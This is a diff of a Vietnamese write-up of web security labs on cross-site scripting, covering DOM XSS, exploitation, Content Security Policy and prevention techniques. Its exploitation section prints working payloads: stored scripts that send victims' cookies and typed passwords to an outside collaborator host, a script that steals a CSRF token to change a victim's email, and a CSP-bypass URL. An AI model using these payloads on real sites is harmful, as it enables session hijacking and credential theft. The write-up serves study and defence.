@@ -357,7 +357,7 @@ Vì dữ liệu từ storeId được chèn trực tiếp vào HTML bằng docum
 ##### 3.3.3 DOM XSS trong innerHTML sử dụng nguồn location.search
 Lab này tồn tại lỗ hổng XSS (Cross-site Scripting) dựa trên DOM trong chức năng tìm kiếm của blog. Ứng dụng sử dụng gán innerHTML để hiển thị nội dung vào một thẻ div, lấy dữ liệu trực tiếp từ location.search.
 
-Bước 1: Nhập tìm kiếm <img src=1 onerror=alert(1)> 
+Bước 1: Nhập tìm kiếm `<img src=1 onerror=alert(1)>` 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4bb2de13-b5e7-4727-8ebb-6e7cec2a92cb" />
 Giá trị của src không hợp lệ và trả về lỗi. Điều này kích hoạt trình xử lý sự kiện onerror, sau đó gọi alert(). Kết quả là, payload được thực thi bất cứ khi nào trình duyệt của người dùng cố gắng tải trang chứa bài đăng độc hại.
 
@@ -409,26 +409,279 @@ Bước 3: Nhập `\"-alert(1)}//` vào ô tìm kiếm:
 Payload thành công vì lợi dụng việc eval() xử lý JSON, kết hợp kỹ thuật thoát chuỗi bằng backslash chưa được lọc, cho phép chèn JavaScript trực tiếp.
 
 ##### 3.3.8 Stored DOM XSS
-Bước 1:  Đăng bình luận có chứa vector: <><img src=1 onerror=alert(1)>
+Bước 1:  Đăng bình luận có chứa vector: 
+`<><img src=1 onerror=alert(1)>`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ddfb424f-e5a1-43b3-8b42-5d876f54eaee" />
-Website dùng replace() để lọc < >, nhưng chỉ thay lần đầu.Trong payload cặp < > đầu bị lọc, nhưng <img ...> phía sau vẫn chèn vào DOM. Kết quả: ảnh lỗi → onerror=alert(1) chạy → popup hiện ra.
+Website dùng replace() để lọc < >, nhưng chỉ thay lần đầu.Trong payload cặp < > đầu bị lọc, nhưng <img ...> phía sau vẫn chèn vào DOM. 
+
+Kết quả: ảnh lỗi → onerror=alert(1) chạy → popup hiện ra.
 
 ##### 3.3.9 Những sink dẫn đến DOM XSS
-- Nguyên nhân chính:
-      + document.write()                       + element.outerHTML
-      + element.insertAdjacentHTML             + document.writeln()
-      + document.domain                        + element.innerHTML
-      + element.onevent
-- Các hàm jQuery:
-      + add()                  + wrap()
-      + after()                + wrapInner()
-      + append()               + wrapAll()
-      + animate()              + has()
-      + insertAfter()          + constructor()
-      + insertBefore()         + init()
-      + before()               + index()
-      + html()                 + jQuery.parseHTML()
-      + prepend()              + $.parseHTML()
-      + replaceAll()           ++ replaceWith()  
+### Nguyên nhân chính:
+|                               |                               |
+|-------------------------------|-------------------------------|
+| `document.write()`            | `element.outerHTML`           |
+| `element.insertAdjacentHTML`  | `document.writeln()`          |
+| `document.domain`             | `element.innerHTML`           |
+| `element.onevent`             |                               |
 
-##### 3.3.10 Cách ngăn chặn DOM XSS: Không cho phép dữ liệu từ bất kỳ nguồn không đáng tin cậy nào được ghi động vào tài liệu HTML.
+### Các hàm jQuery:
+|                               |                               |
+|-------------------------------|-------------------------------|
+| `add()`                       | `wrap()`                      |
+| `after()`                     | `wrapInner()`                 |
+| `append()`                    | `wrapAll()`                   |
+| `animate()`                   | `has()`                       |
+| `insertAfter()`               | `constructor()`                |
+| `insertBefore()`              | `init()`                      |
+| `before()`                    | `index()`                     |
+| `html()`                      | `jQuery.parseHTML()`          |
+| `prepend()`                   | `$.parseHTML()`               |
+| `replaceAll()`                | `replaceWith()`               |
+
+
+
+##### 3.3.10 Cách ngăn chặn DOM XSS: 
+Không cho phép dữ liệu từ bất kỳ nguồn không đáng tin cậy nào được ghi động vào tài liệu HTML.
+
+
+
+-----
+### 4. Khai thác lỗ hổng cross-site scripting
+#### 4.1 Khai thác tấn công cross-site scripting để đánh cắp cookie
+Lab này chứa một lỗ hổng XSS được lưu trữ trong chức năng bình luận của blog. Người dùng giả lập sẽ xem tất cả bình luận sau khi chúng được đăng. Để giải quyết bài thực hành, hãy khai thác lỗ hổng để đánh cắp cookie phiên của nạn nhân, sau đó sử dụng cookie này để mạo danh nạn nhân.
+
+Bước 1: Chuyển đến tab the Collaborator, nhấn vào Copy to clipboard
+
+Bước 2: Gửi nội dung sau vào blog:
+```
+<script>
+fetch('https://1kmlk85vcr4wxtot3mjir0sxdojf7kv9.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+Tập lệnh này sẽ gửi yêu cầu POST chứa cookie của bất kỳ ai xem bình luận đến tên miền phụ của bạn trên máy chủ Collaborator công khai.
+
+Bước 3: Quay lại Collaborator. Ghi lại giá trị cookie của nạn nhân trong nội dung POST.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7d32d32d-eccf-4c31-bfe4-576155ef7714" />
+Giá trị cookie: `3XsEYKip1OGABghv3wdMZRm1y0fT5a0H`
+
+Bước 4: Tải lại trang blog chính, sử dụng Burp Repeater để thay thế cookie phiên của ta bằng cookie ta đã ghi lại trong Burp Collaborator. 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13dda52b-e65f-4e72-9382-55d6d703bd34" />
+Ta cũng có thể dùng cùng một cookie trong yêu cầu /my-account để tải trang tài khoản của người dùng quản trị
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3f18300c-287a-411b-a609-913de28201f4" />
+
+#### 4.2 Khai thác tấn công cross-site scripting để lấy mật khẩu
+Bước 1: Nhập bình luận sao vào hộp blog:
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://fatzamv925uan7e7t09wheib329t8hy5n.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+Tập lệnh này sẽ gửi yêu cầu POST có chứa tên người dùng và mật khẩu tới tên miền phụ của máy chủ Collaborator công khai cho bất kỳ ai xem bình luận.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/48819c2f-e971-4772-bc75-1933126fdb7e" />
+- Ta có được tên người dùng là: administrator
+- Mật khẩu là : 0kmwb3gtjxe1q5z8uc2c
+
+Bước 2: Sử dụng thông tin để đăng nhập
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/510a036d-28b4-4f59-8389-172ce9c7a49b" />
+
+#### 4.3 Khai thác tấn công cross-site scripting để vượt qua các biện pháp bảo vệ CSRF
+Bài lab này khai thác lỗ hổng này để đánh cắp mã thông báo CSRF, sau đó ta có thể sử dụng mã thông báo này để thay đổi địa chỉ email của người xem bình luận trên bài đăng trên blog
+
+- Thông tin đăng nhập: wiener:peter
+
+Bước 1: Sử dụng thông tin đăng nhập wiener:peter. 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dccd5f97-41b5-4913-96fc-3042013e3663" />
+- Khi gửi yêu cầu POST tới /my-account/change-email, với tham số có tên là email.
+- Có một mã thông báo chống CSRF trong đầu vào ẩn có tên là token.
+
+Bước 2: Dán nội dung sao vào blog.Điều này sẽ khiến bất kỳ ai xem bình luận gửi yêu cầu POST để thay đổi địa chỉ email của họ thành test@test.com.
+```
+ <script>
+          var req = new XMLHttpRequest();
+          req.onload = handleResponse;
+          req.open('get','/my-account',true);
+          req.send();
+          function handleResponse() {
+              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+              var changeReq = new XMLHttpRequest();
+              changeReq.open('post', '/my-account/change-email', true);
+              changeReq.send('csrf='+token+'&email=test@test.com')
+          };
+          </script>
+```
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e1cb7bd2-aab6-4978-823d-10f16bb6dda3" />
+
+- Trang đổi email có CSRF token, bình thường sẽ chặn tấn công CSRF.
+- Nhưng trang blog bị Stored XSS, attacker chèn JavaScript độc hại vào bình luận.
+- Khi nạn nhân xem bình luận, script chạy trong trình duyệt của họ:
+  + Gửi request GET tới /my-account để lấy CSRF token hợp lệ.
+  + Dùng token đó để gửi POST tới /my-account/change-email kèm email giả.
+- Do request được gửi bằng session của nạn nhân → hệ thống tin là hợp lệ → email của nạn nhân bị đổi.
+
+
+
+----
+### 5. Chính sách bảo mật nội dung
+CSP là một cơ chế bảo mật trình duyệt nhằm mục đích giảm thiểu XSS và một số cuộc tấn công khác. Nó hoạt động bằng cách hạn chế các tài nguyên (như tập lệnh và hình ảnh) mà một trang có thể tải và hạn chế việc một trang có thể được đóng khung bởi các trang khác hay không.
+
+Để bật CSP, phản hồi cần bao gồm tiêu đề phản hồi HTTP được gọi Content-Security-Policyvới giá trị chứa chính sách. Bản thân chính sách bao gồm một hoặc nhiều chỉ thị, được phân tách bằng dấu chấm phẩy
+
+#### 5.1 Giảm thiểu các cuộc tấn công XSS bằng CSP
+- Trước tiên hãy thực hiện một cuộc tấn công mã lệnh chéo trang web (cross-site scripting) bỏ qua CSP và đánh cắp mã thông báo CSRF của người dùng nạn nhân được mô phỏng bằng Burp Collaborator. Sau đó, bạn cần thay đổi địa chỉ email của người dùng được mô phỏng thành hacker@evil-user.net.
+- Bạn phải gắn nhãn vector của mình bằng từ "Click" để khuyến khích người dùng mô phỏng nhấp vào nó.Ví dụ: `<a href="">Click me</a>`
+- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:wiener:peter
+
+Bước 1: Đăng nhập bằng tài khoản được cung cấp. Quan sát thấy có lỗ hổng XSS trong tham số email
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7208c024-0cbc-4cbe-8cdc-24a6541a06ea" />
+Bước 2: Vào máy chủ khai thác và nhập đoạn code sau: 
+
+
+#### 5.2 Giảm thiểu các cuộc tấn công dangling markup bằng cách sử dụng CSP
+- Chỉ thị CSP sau chỉ cho phép tải hình ảnh từ cùng một nguồn (cùng domain) với trang: `img-src 'self'`
+- Chỉ thị CSP khác chỉ cho phép tải hình ảnh từ một tên miền cụ thể:
+`img-src https://images.normal-website.com`
+
+Các chính sách này giúp ngăn chặn một số dạng tấn công dangling markup, vì kẻ tấn công thường lợi dụng thẻ <img> để thu thập dữ liệu mà không cần tương tác từ người dùng.
+
+Tuy nhiên, CSP không thể ngăn chặn hoàn toàn, chẳng hạn như khi kẻ tấn công chèn thẻ <a> với thuộc tính href bị treo để khai thác.
+
+
+#### 5.3 Vượt qua CSP bằng cách chèn chính sách : Reflected XSS được bảo vệ bởi CSP, với CSP bypass
+Bước 1: Nhập `<img src=1 onerror=alert(1)>` vào ô tìm kiếm
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d0909992-2ab4-4a8e-a7e2-d19b8ef36d10" />
+- CSP ngăn không cho tập lệnh thực thi.
+- Phản hồi chứa một tiêu đề Content-Security-Policy và report-uri chứa một tham số có tên là token
+- Bước 2: Truy cập URL sau:
+https://0acb006704f1707581628910009b003b.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/77e0ceef-6438-437f-99c6-af59ef8604d9" />
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5b6bfac-910a-46de-a500-cdba77c3c214" />
+Trong CSP, có thể lợi dụng chỉ thị script-src-elem. Chỉ thị này áp dụng riêng cho các phần tử <script>.
+
+Khi sử dụng nó, kẻ tấn công có thể ghi đè các quy tắc của script-src.
+
+Nếu ghi đè thành công để cho phép unsafe-inline, thì việc chèn và thực thi script nội tuyến (inline script) sẽ trở nên khả thi.
+
+
+#### 5.4 Bảo vệ chống lại clickjacking bằng CSP
+frame-ancestors trong CSP dùng để kiểm soát việc trang có được nhúng trong khung hay không.
+
+- frame-ancestors 'self' cho phép nhúng từ cùng nguồn gốc.
+- frame-ancestors 'none' chặn hoàn toàn nhúng.
+
+So với X-Frame-Options, CSP linh hoạt hơn vì cho phép nhiều domain, ký tự đại diện và kiểm tra toàn bộ chuỗi khung cha. Khuyến nghị dùng CSP để chống clickjacking, đồng thời kết hợp X-Frame-Options cho các trình duyệt cũ không hỗ trợ CSP.
+
+---
+
+### 6 Phòng chống XSS
+#### 6.1 Mã hóa dữ liệu trên đầu ra
+Mã hóa phải được áp dụng ngay trước khi ghi dữ liệu do người dùng kiểm soát lên trang, và loại mã hóa phụ thuộc vào ngữ cảnh:
+
+Trong HTML: ký tự đặc biệt phải chuyển thành thực thể HTML (< → &lt;, > → &gt;).
+
+Trong chuỗi JavaScript: ký tự không phải chữ và số phải thoát Unicode (< → \u003c, > → \u003e).
+
+Ngữ cảnh lồng nhau (ví dụ trong thuộc tính onclick): cần nhiều lớp mã hóa theo đúng thứ tự (trước tiên thoát theo ngữ cảnh JavaScript, sau đó mã hóa HTML).
+
+#### 6.2 Xác thực đầu vào khi đến
+- Mã hóa rất quan trọng trong phòng chống XSS, nhưng không đủ.
+- Cần thêm xác thực đầu vào càng sớm càng tốt.
+- Ví dụ xác thực đầu vào:
+  + URL: chỉ cho phép http hoặc https, chặn javascript:, data:…
+  + Số: kiểm tra có phải số nguyên thật không.
+  + Ký tự: chỉ cho phép tập ký tự mong đợi.
+- Nguyên tắc: Danh sách trắng (whitelist) tốt hơn danh sách đen (blacklist).
+  + Whitelist: chỉ cho phép giá trị hợp lệ đã định nghĩa (an toàn, ổn định).
+  + Blacklist: dễ bị bypass khi xuất hiện kỹ thuật hoặc giao thức mới.
+ 
+#### 6.3 Cho phép HTML "an toàn"
+- **Nguyên tắc**
+
+  - Tránh cho phép người dùng đăng HTML, trừ khi thật sự cần thiết (ví dụ: bình luận blog).
+
+- **Cách tiếp cận cũ**
+
+  - Lọc bằng danh sách trắng các **thẻ/thuộc tính an toàn**.  
+  - Nhược điểm: rất khó đảm bảo an toàn vì:
+    - Khác biệt trong cách các trình phân tích (parser) xử lý.  
+    - Nguy cơ phát sinh các lỗi XSS đột biến.
+
+- **Giải pháp thực tế**
+
+  - Sử dụng thư viện như **DOMPurify** để lọc và mã hóa ngay trong trình duyệt.  
+  - Hoặc: cho phép nhập **Markdown** rồi chuyển đổi sang HTML.
+
+- **Hạn chế**
+
+  - Ngay cả các thư viện này cũng có thể tồn tại lỗ hổng.  
+  - Do đó, cần **theo dõi và cập nhật bảo mật thường xuyên**.
+ 
+#### 6.4 Cách ngăn chặn XSS bằng cách sử dụng công cụ tạo mẫu
+Nhiều framework/template engine (Twig, Freemarker, Jinja, React…) có cơ chế thoát (escaping) nội dung động để ngăn XSS. Một số yêu cầu chỉ định rõ (như e('html') trong Twig), còn một số mặc định thoát sẵn. Khi chọn công cụ, cần xem xét kỹ cách nó xử lý thoát dữ liệu để đảm bảo an toàn.
+
+#### 6.5 Ngăn chặn XSS trong PHP, JavaScript và jQuery 
+ ##### Trong PHP:
+ - Trong ngữ cảnh HTML: sử dụng `htmlentities()` với 3 đối số:
+   `<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>`
+- Trong ngữ cảnh JavaScript: PHP không có sẵn hàm thoát Unicode, cần tự viết:
+```
+<?php
+function jsEscape($str) {
+    $output = '';
+    foreach (str_split($str) as $chr) {
+        $chrNum = ord($chr);
+        switch ($chr) {
+            case "'": case '"': case "\n": case "\r":
+            case "&": case "\\": case "<": case ">":
+                $output .= sprintf("\\u%04x", $chrNum);
+                break;
+            default:
+                $output .= $chr;
+                break;
+        }
+    }
+    return $output;
+}
+?>
+<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
+```
+##### Trong JavaScript
+- Trong HTML: cần viết hàm encode để thay thế ký tự đặc biệt bằng HTML entities:
+```
+function htmlEncode(str) {
+    return String(str).replace(/[^\w. ]/gi, c =>
+        '&#' + c.charCodeAt(0) + ';'
+    );
+}
+
+document.body.innerHTML = htmlEncode(untrustedValue);
+```
+- Trong chuỗi JavaScript: cần thoát Unicode:
+```
+function jsEscape(str) {
+    return String(str).replace(/[^\w. ]/gi, c =>
+        '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)
+    );
+}
+
+document.write('<script>x="' + jsEscape(untrustedValue) + '";<\/script>');
+```
+##### Trong jQuery
+- XSS thường xảy ra khi truyền dữ liệu người dùng vào bộ chọn jQuery (ví dụ location.hash).
+- Phiên bản mới của jQuery đã hạn chế, nhưng vẫn nên:
+  + Không đưa dữ liệu không đáng tin trực tiếp vào selector.
+  + Nếu cần, hãy thoát bằng jsEscape() trước khi dùng.
+
+
+#### 6.6 Giảm thiểu XSS bằng chính sách bảo mật nội dung CSP
+CSP (Content Security Policy) là lớp phòng thủ cuối cùng chống XSS, giúp hạn chế thiệt hại nếu kẻ tấn công chèn được mã độc. CSP được triển khai qua header HTTP Content-Security-Policy để kiểm soát nguồn tài nguyên có thể tải, cho phép hay chặn script nội tuyến và script bên ngoài. Ví dụ, chính sách default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none'; chỉ cho phép tài nguyên từ cùng nguồn, chặn object, frame và thay đổi base.
+
+Nếu cần tải tài nguyên ngoài, nên hạn chế whitelist, tốt nhất là lưu trữ trên domain riêng. Ngoài ra, có thể dùng hash hoặc nonce để chỉ cho phép thực thi script hợp lệ do server cấp, ngăn chặn kẻ tấn công lợi dụng. CSP không thay thế việc phòng ngừa XSS từ đầu, nhưng là cơ chế bổ sung quan trọng để giảm thiểu rủi ro.
+
